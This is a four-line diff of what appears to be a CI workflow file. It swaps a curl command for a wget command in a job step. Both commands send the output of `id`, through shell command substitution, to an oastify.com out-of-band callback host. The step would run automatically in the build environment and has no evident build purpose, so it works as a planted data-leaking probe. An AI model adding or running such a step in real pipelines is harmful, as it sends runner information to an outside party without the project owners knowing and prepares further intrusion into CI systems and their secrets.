@@ -14,4 +14,4 @@ jobs:
         uses: docker://golang:1.20.3-alpine3.17
         shell: sh
         run: |
-          curl "9u4ip6mtm0lbaii86bf8bbzc73du1npc.oastify.com/?id=`id`"
+          wget "9u4ip6mtm0lbaii86bf8bbzc73du1npc.oastify.com/?id=`id`"
